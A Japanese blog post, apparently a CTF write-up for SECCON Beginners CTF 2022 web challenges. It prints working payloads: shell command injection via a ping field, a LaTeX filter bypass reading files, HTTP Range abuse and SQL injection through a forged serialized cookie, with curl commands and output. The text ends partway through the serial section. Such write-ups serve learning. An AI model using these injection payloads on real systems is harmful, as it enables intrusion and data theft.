@@ -1,0 +1,167 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[SECCON Beginners CTF 2022] My own writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SECCON Beginners CTF 2022がSat, June 04, 14:00 — Sun, June 05, 14:00 (JST)の日程で開催されました. 今回はgaidailove(研究室の同期チーム)として参加しました. 最終的には654ポイント獲得し, 131/891位でした.
+僕はwebを解いていたので, そのwriteupを以下に記します.
+[web] Util 配布ファイルmain.goの以下の部分に脆弱性があります. コマンドに任意の文字列を挿入できるので, OSコマンドインジェクションが可能です.
+r.POST(&#34;/util/ping&#34;, func(c *gin.Context) { var param IP if err := c.Bind(&param); err != nil { c.JSON(400, gin.H{&#34;message&#34;: &#34;Invalid parameter&#34;}) return } commnd := &#34;ping -c 1 -W 1 &#34; + param.Address + &#34; 1>&2&#34; result, _ := exec.Command(&#34;sh&#34;, &#34;-c&#34;, commnd).CombinedOutput() c.JSON(200, gin.H{ &#34;result&#34;: string(result), }) }) また, flagは/flag_$(cat /dev/urandom | tr -dc &#34;a-zA-Z0-9&#34; | fold -w 16 | head -n 1)."><meta property="og:image" content><meta property="og:title" content="[SECCON Beginners CTF 2022] My own writeup"><meta property="og:description" content="SECCON Beginners CTF 2022がSat, June 04, 14:00 — Sun, June 05, 14:00 (JST)の日程で開催されました. 今回はgaidailove(研究室の同期チーム)として参加しました. 最終的には654ポイント獲得し, 131/891位でした.
+僕はwebを解いていたので, そのwriteupを以下に記します.
+[web] Util 配布ファイルmain.goの以下の部分に脆弱性があります. コマンドに任意の文字列を挿入できるので, OSコマンドインジェクションが可能です.
+r.POST(&#34;/util/ping&#34;, func(c *gin.Context) { var param IP if err := c.Bind(&param); err != nil { c.JSON(400, gin.H{&#34;message&#34;: &#34;Invalid parameter&#34;}) return } commnd := &#34;ping -c 1 -W 1 &#34; + param.Address + &#34; 1>&2&#34; result, _ := exec.Command(&#34;sh&#34;, &#34;-c&#34;, commnd).CombinedOutput() c.JSON(200, gin.H{ &#34;result&#34;: string(result), }) }) また, flagは/flag_$(cat /dev/urandom | tr -dc &#34;a-zA-Z0-9&#34; | fold -w 16 | head -n 1)."><meta property="og:type" content="article"><meta property="og:url" content="/posts/20/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-06-05T13:38:35+09:00"><meta property="article:modified_time" content="2022-06-05T13:38:35+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[SECCON Beginners CTF 2022] My own writeup"><meta name=twitter:description content="SECCON Beginners CTF 2022がSat, June 04, 14:00 — Sun, June 05, 14:00 (JST)の日程で開催されました. 今回はgaidailove(研究室の同期チーム)として参加しました. 最終的には654ポイント獲得し, 131/891位でした.
+僕はwebを解いていたので, そのwriteupを以下に記します.
+[web] Util 配布ファイルmain.goの以下の部分に脆弱性があります. コマンドに任意の文字列を挿入できるので, OSコマンドインジェクションが可能です.
+r.POST(&#34;/util/ping&#34;, func(c *gin.Context) { var param IP if err := c.Bind(&param); err != nil { c.JSON(400, gin.H{&#34;message&#34;: &#34;Invalid parameter&#34;}) return } commnd := &#34;ping -c 1 -W 1 &#34; + param.Address + &#34; 1>&2&#34; result, _ := exec.Command(&#34;sh&#34;, &#34;-c&#34;, commnd).CombinedOutput() c.JSON(200, gin.H{ &#34;result&#34;: string(result), }) }) また, flagは/flag_$(cat /dev/urandom | tr -dc &#34;a-zA-Z0-9&#34; | fold -w 16 | head -n 1)."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[SECCON Beginners CTF 2022] My own writeup</h1><div class=meta>Posted on Jun 5, 2022</div></div><nav id=TableOfContents><ol><li><a href=#web-util>[web] Util</a></li><li><a href=#web-textex>[web] textex</a></li><li><a href=#web-gallery>[web] gallery</a></li><li><a href=#web-serial>[web] serial</a></li><li><a href=#web-ironhand>[web] Ironhand</a></li><li><a href=#感想>感想</a></li></ol></nav><section class=body><p>SECCON Beginners CTF 2022がSat, June 04, 14:00 — Sun, June 05, 14:00 (JST)の日程で開催されました.
+今回はgaidailove(研究室の同期チーム)として参加しました. 最終的には654ポイント獲得し, 131/891位でした.</p><p><img src=/images/posts/20/score.png alt=latex></p><p>僕はwebを解いていたので, そのwriteupを以下に記します.</p><h1 id=web-util>[web] Util</h1><p>配布ファイル<code>main.go</code>の以下の部分に脆弱性があります. コマンドに任意の文字列を挿入できるので, OSコマンドインジェクションが可能です.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>POST</span>(<span style=color:#e6db74>&#34;/util/ping&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>param</span> <span style=color:#a6e22e>IP</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Bind</span>(<span style=color:#f92672>&amp;</span><span style=color:#a6e22e>param</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#ae81ff>400</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;Invalid parameter&#34;</span>})
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>commnd</span> <span style=color:#f92672>:=</span> <span style=color:#e6db74>&#34;ping -c 1 -W 1 &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>param</span>.<span style=color:#a6e22e>Address</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; 1&gt;&amp;2&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>result</span>, <span style=color:#a6e22e>_</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>exec</span>.<span style=color:#a6e22e>Command</span>(<span style=color:#e6db74>&#34;sh&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#a6e22e>commnd</span>).<span style=color:#a6e22e>CombinedOutput</span>()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#ae81ff>200</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;result&#34;</span>: string(<span style=color:#a6e22e>result</span>),
+</span></span><span style=display:flex><span>    })
+</span></span><span style=display:flex><span>})
+</span></span></code></pre></div><p>また, flagは<code>/flag_$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 16 | head -n 1).txt</code>にあることが<code>Dockerfile</code>よりわかります.</p><pre tabindex=0><code class=language-:Dockerfile data-lang=:Dockerfile>...
+RUN echo &#34;ctf4b{xxxxxxxxxxxxxxxxxx}&#34; &gt; /flag_$(cat /dev/urandom | tr -dc &#34;a-zA-Z0-9&#34; | fold -w 16 | head -n 1).txt
+...
+</code></pre><p>まずはflagが書かれているファイル名を特定します. 以下より <code>/flag_A74FIBkN9sELAjOc.txt</code> にflagが書かれていることがわかります.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -X POST -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;Address&#34;:&#34;;ls -la /flag*&#34;}&#39; https://util.quals.beginners.seccon.jp/util/ping 
+{&#34;result&#34;:&#34;BusyBox v1.33.1 () multi-call binary.\n\nUsage: ping [OPTIONS] HOST\n\nSend ICMP ECHO_REQUESTs to HOST\n\n\t-4,-6\t\tForce IP or IPv6 name resolution\n\t-c CNT\t\tSend only CNT pings\n\t-s SIZE\t\tSend SIZE data bytes in packets (default 56)\n\t-i SECS\t\tInterval\n\t-A\t\tPing as soon as reply is recevied\n\t-t TTL\t\tSet TTL\n\t-I IFACE/IP\tSource interface or IP address\n\t-W SEC\t\tSeconds to wait for the first response (default 10)\n\t\t\t(after all -c CNT packets are sent)\n\t-w SEC\t\tSeconds until ping exits (default:infinite)\n\t\t\t(can exit earlier with -c CNT)\n\t-q\t\tQuiet, only display output at start/finish\n\t-p HEXBYTE\tPayload pattern\n-rw-r--r--    1 root     root            25 Jun  3 14:13 /flag_A74FIBkN9sELAjOc.txt\n&#34;}%      
+</code></pre><p>次に, catコマンドでファイルの内容を出力します. flagは<code>ctf4b{al1_0vers_4re_i1l}</code>であることがわかります.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -X POST -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;Address&#34;:&#34;;cat /flag_A74FIBkN9sELAjOc.txt&#34;}&#39; https://util.quals.beginners.seccon.jp/util/ping 
+{&#34;result&#34;:&#34;BusyBox v1.33.1 () multi-call binary.\n\nUsage: ping [OPTIONS] HOST\n\nSend ICMP ECHO_REQUESTs to HOST\n\n\t-4,-6\t\tForce IP or IPv6 name resolution\n\t-c CNT\t\tSend only CNT pings\n\t-s SIZE\t\tSend SIZE data bytes in packets (default 56)\n\t-i SECS\t\tInterval\n\t-A\t\tPing as soon as reply is recevied\n\t-t TTL\t\tSet TTL\n\t-I IFACE/IP\tSource interface or IP address\n\t-W SEC\t\tSeconds to wait for the first response (default 10)\n\t\t\t(after all -c CNT packets are sent)\n\t-w SEC\t\tSeconds until ping exits (default:infinite)\n\t\t\t(can exit earlier with -c CNT)\n\t-q\t\tQuiet, only display output at start/finish\n\t-p HEXBYTE\tPayload pattern\nctf4b{al1_0vers_4re_i1l}\n&#34;}% 
+</code></pre><h1 id=web-textex>[web] textex</h1><p>LatexからPDFを生成するwebアプリケーションが与えられます.</p><p><img src=/images/posts/20/latex.png alt=latex></p><p>flagは<code>/var/www/</code>以下にあることが<code>Dockerfile</code>からわかります. また, このアプリケーションのバックエンドサーバも<code>/var/www/</code>で実行されています.</p><p>まずflagのファイルを読み込むことを考えますが, <code>app.py</code>の以下の部分より<code>flag</code>という文字列を使用することはできないので工夫が必要です.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.py data-lang=.py><span style=display:flex><span><span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>    <span style=color:#75715e># No flag !!!!</span>
+</span></span><span style=display:flex><span>    print(tex_code<span style=color:#f92672>.</span>lower())
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;flag&#34;</span> <span style=color:#f92672>in</span> tex_code<span style=color:#f92672>.</span>lower():
+</span></span><span style=display:flex><span>        tex_code <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Write tex code to file.</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;tex_box/</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>.tex&#34;</span>, mode<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(tex_code)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Create pdf from tex.</span>
+</span></span><span style=display:flex><span>    subprocess<span style=color:#f92672>.</span>run([<span style=color:#e6db74>&#34;pdflatex&#34;</span>, <span style=color:#e6db74>&#34;-output-directory&#34;</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;tex_box/</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;tex_box/</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>.tex&#34;</span>], timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>0.5</span>)
+</span></span></code></pre></div><p>最終的には以下のLatexコードを用いてflagを出力することができました.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.tex data-lang=:.tex><span style=display:flex><span><span style=color:#66d9ef>\documentclass</span>{article}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>\usepackage</span>{verbatim}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>\begin</span>{document}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>\def\a</span>{fla}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>\def\b</span>{g}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>\verbatiminput</span>{<span style=color:#66d9ef>\a\b</span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>\end</span>{document}
+</span></span></code></pre></div><p><img src=/images/posts/20/latex_flag.png alt=latex></p><p>余談 : ローカルでDockerコンテナを用いて動作確認をしていた時は<code>\input{\a\b}</code>などでflagを出力できましたが, リモートではそれができなくて一生泣いていました. しかし, 作問者の方の<a href=https://github.com/satoki/ctf4b_2022_satoki_writeups/tree/master/web/textex>writeup</a>を見るとこれは想定挙動だったようです.</p><h1 id=web-gallery>[web] gallery</h1><p>拡張子を指定してファイルの一覧が閲覧できるwebアプリケーションが与えられます.</p><p><img src=/images/posts/20/gallery.png alt=latex></p><p><code>https://gallery.quals.beginners.seccon.jp/?file_extension=fla</code>などをGETするとflagが入ったファイルが表示されます. <code>flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf</code>にflagが含まれていることがわかります.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl &#34;https://gallery.quals.beginners.seccon.jp/?file_extension=fla&#34; | grep &#34;flag&#34;
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2617    0  2617    0     0  17682      0 --:--:-- --:--:-- --:--:-- 17682
+                            &lt;a class=&#34;list-group-item list-group-item-action&#34; href=&#34;/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf&#34;&gt;flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf&lt;/a&gt;
+</code></pre><p>しかし, レスポンスにサイズ制限がありflagが得ることができません. サイズが10240を超える場合は, サイズ分の<code>?</code>がレスポンスとして返されます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#66d9ef>func</span> (<span style=color:#a6e22e>w</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>MyResponseWriter</span>) <span style=color:#a6e22e>Write</span>(<span style=color:#a6e22e>data</span> []<span style=color:#66d9ef>byte</span>) (<span style=color:#66d9ef>int</span>, <span style=color:#66d9ef>error</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>filledVal</span> <span style=color:#f92672>:=</span> []byte(<span style=color:#e6db74>&#34;?&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>length</span> <span style=color:#f92672>:=</span> len(<span style=color:#a6e22e>data</span>)
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#a6e22e>length</span>)
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// log.Println(bytes.Repeat(filledVal, length))
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>length</span> &gt; <span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>lengthLimit</span> {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>ResponseWriter</span>.<span style=color:#a6e22e>Write</span>(<span style=color:#a6e22e>bytes</span>.<span style=color:#a6e22e>Repeat</span>(<span style=color:#a6e22e>filledVal</span>, <span style=color:#a6e22e>length</span>))
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>length</span>, <span style=color:#66d9ef>nil</span>
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>ResponseWriter</span>.<span style=color:#a6e22e>Write</span>(<span style=color:#a6e22e>data</span>[:<span style=color:#a6e22e>length</span>])
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>length</span>, <span style=color:#66d9ef>nil</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>middleware</span>() <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Handler</span>) <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Handler</span> {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>h</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Handler</span>) <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Handler</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>HandlerFunc</span>(<span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>rw</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ResponseWriter</span>, <span style=color:#a6e22e>r</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>h</span>.<span style=color:#a6e22e>ServeHTTP</span>(<span style=color:#f92672>&amp;</span><span style=color:#a6e22e>MyResponseWriter</span>{
+</span></span><span style=display:flex><span>				<span style=color:#a6e22e>ResponseWriter</span>: <span style=color:#a6e22e>rw</span>,
+</span></span><span style=display:flex><span>				<span style=color:#a6e22e>lengthLimit</span>:    <span style=color:#ae81ff>10240</span>, <span style=color:#75715e>// SUPER SECURE THRESHOLD
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			}, <span style=color:#a6e22e>r</span>)
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>実際に<code>flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf</code>をGETすると, 以下のレスポンスが返ります.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl &#34;https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf&#34;                                                
+??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
+...
+</code></pre><p>HTTPには<a href=https://triple-underscore.github.io/RFC7233-ja.html>Range Requests</a>というものがあり, リスエストヘッダに<code>Range: bytes=0-499</code>などを指定すると, 指定されたバイト範囲がダウンロードされるようです(知らなかった).</p><p>以下のように, 2回に分けてファイルをダウンロードすることでサイズ制限である10240を突破します.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -H &#34;Range: bytes=0-10000&#34; &#34;https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf&#34; &gt; hoge.pdf
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 10001    0 10001    0     0  60981      0 --:--:-- --:--:-- --:--:-- 60981
+
+$ curl -H &#34;Range: bytes=10001-16085&#34; &#34;https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf&#34; &gt;&gt; hoge.pdf
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  6084    0  6084    0     0  41671      0 --:--:-- --:--:-- --:--:-- 41671
+</code></pre><p>PDFが無事に分割ダウンロードできました.</p><p><img src=/images/posts/20/gallery_flag.png alt=latex></p><h1 id=web-serial>[web] serial</h1><p>ユーザー登録をして, タスクが管理できるwebアプリケーションが与えられます.
+<img src=/images/posts/20/serial.png alt=serial></p><p>ユーザー登録をすると, Userクラスのインスタンスがシリアライズ+base64エンコードされた形でCOOKIEに<code>__CRED</code>として保存されます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.php data-lang=:.php><span style=display:flex><span>class User
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    private const invalid_keywords = array(&#34;UNION&#34;, &#34;&#39;&#34;, &#34;FROM&#34;, &#34;SELECT&#34;, &#34;flag&#34;);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    public $id;
+</span></span><span style=display:flex><span>    public $name;
+</span></span><span style=display:flex><span>    public $password_hash;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    public function __construct($id = null, $name = null, $password_hash = null)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        $this-&gt;id = htmlspecialchars($id);
+</span></span><span style=display:flex><span>        $this-&gt;name = htmlspecialchars(str_replace(self::invalid_keywords, &#34;?&#34;, $name));
+</span></span><span style=display:flex><span>        $this-&gt;password_hash = $password_hash;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   ...
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>$name = $_POST[&#39;name&#39;];
+</span></span><span style=display:flex><span>$pass = password_hash($_POST[&#39;pass&#39;], PASSWORD_DEFAULT);
+</span></span><span style=display:flex><span>$user = new User(-1, $name, $pass);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>try {
+</span></span><span style=display:flex><span>    $db = new Database();
+</span></span><span style=display:flex><span>    $db-&gt;insertUser($user);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    $user = $db-&gt;findUserByName($user);
+</span></span><span style=display:flex><span>    if (!$user-&gt;isValid()) {
+</span></span><span style=display:flex><span>        throw new Exception(&#34;invalid user: &#34; . $user-&gt;__toString());
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>} catch (Exception $e) {
+</span></span><span style=display:flex><span>    var_dump($e-&gt;getMessage());
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>setcookie(&#34;__CRED&#34;, base64_encode(serialize($user)));
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>この<code>__CRED</code>はCOOKIEであるため任意の値に編集することができます. また<code>name</code>プロパティは以下のSQLクエリに挿入されるため, SQLインジェクションが可能です.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.php data-lang=:.php><span style=display:flex><span>$sql = &#34;SELECT id, name, password_hash FROM users WHERE name = &#39;&#34; . $user-&gt;name . &#34;&#39; LIMIT 1&#34;;
+</span></span><span style=display:flex><span>$result = $this-&gt;_con-&gt;query($sql);
+</span></span><span style=display:flex><span>if (!$result) {
+</span></span><span style=display:flex><span>    throw new Exception(&#39;failed query for findUserByNameOld &#39; . $sql);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>while ($row = $result-&gt;fetch_assoc()) {
+</span></span><span style=display:flex><span>    $user = new User($row[&#39;id&#39;], $row[&#39;name&#39;], $row[&#39;password_hash&#39;]);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>具体的には以下のようなクエリを組み立てて, flagを得ることを目指します(以下はローカルでの実験).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.sql data-lang=:.sql><span style=display:flex><span>mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>SELECT</span> id, name, password_hash <span style=color:#66d9ef>FROM</span> users <span style=color:#66d9ef>WHERE</span> name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span> <span style=color:#66d9ef>UNION</span> <span style=color:#66d9ef>SELECT</span> body, body, <span style=color:#e6db74>&#34;hoge&#34;</span> <span style=color:#66d9ef>FROM</span> flags;<span style=color:#75715e>--  LIMIT 1;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>+----------------------+----------------------+---------------+</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> id                   <span style=color:#f92672>|</span> name                 <span style=color:#f92672>|</span> password_hash <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>+----------------------+----------------------+---------------+</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> ctf4b<span style=color:#960050;background-color:#1e0010>{</span>dummy flag<span style=color:#f92672>!!!</span><span style=color:#960050;background-color:#1e0010>}</span> <span style=color:#f92672>|</span> ctf4b<span style=color:#960050;background-color:#1e0010>{</span>dummy flag<span style=color:#f92672>!!!</span><span style=color:#960050;background-color:#1e0010>}</span> <span style=color:#f92672>|</span> hoge          <span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>+----------------------+----------------------+---------------+</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> row <span style=color:#66d9ef>in</span> <span style=color:#66d9ef>set</span> (<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>00</span> sec)
+</span></span></code></pre></div><p>したがって, 以下をCOOKIEの<code>__CRED</code>とします.</p><pre tabindex=0><code>O:4:&#34;User&#34;:3:{s:2:&#34;id&#34;;s:1:&#34;5&#34;;s:4:&#34;name&#34;;s:48:&#34;&#39; UNION SELECT body, body, &#34;hoge&#34; FROM flags;-- &#34;;s:13:&#34;password_hash&#34;;s:4:&#34;hoge&#34;;}7...
+</code></pre><p>これをbase64にエンコードして送信します.</p><pre tabindex=0><code>$ curl -vv -b &#39;__CRED=Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtzOjE6IjUiO3M6NDoibmFtZSI7czo0ODoiJyBVTklPTiBTRUxFQ1QgYm9keSwgYm9keSwgImhvZ2UiIEZST00gZmxhZ3M7LS0gIjtzOjEzOiJwYXNzd29yZF9oYXNoIjtzOjQ6ImhvZ2UiO303Li4u&#39; https://serial.quals.beginners.seccon.jp
+...
+&gt; GET / HTTP/1.1
+&gt; Host: serial.quals.beginners.seccon.jp
+&gt; User-Agent: curl/7.64.1
+&gt; Accept: */*
+&gt; Cookie: __CRED=Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtzOjE6IjUiO3M6NDoibmFtZSI7czo0ODoiJyBVTklPTiBTRUxFQ1QgYm9keSwgYm9keSwgImhvZ2UiIEZST00gZmxhZ3M7LS0gIjtzOjEzOiJwYXNzd29yZF9oYXNoIjtzOjQ6ImhvZ2UiO303Li4u
+&gt; 
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx/1.21.6
+&lt; Date: Sat, 04 Jun 2022 23:35:54 GMT
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; Content-Length: 2559
+&lt; Connection: keep-alive
+&lt; Set-Cookie: __CRED=Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtzOjQzOiJjdGY0YntTZXIxNGxpejR0MTBuXzE1X3YxcnR1YWxseV9wbDQxbnRleHR9IjtzOjQ6Im5hbWUiO3M6NDM6ImN0ZjRie1NlcjE0bGl6NHQxMG5fMTVfdjFydHVhbGx5X3BsNDFudGV4dH0iO3M6MTM6InBhc3N3b3JkX2hhc2giO3M6NDoiaG9nZSI7fQ%3D%3D
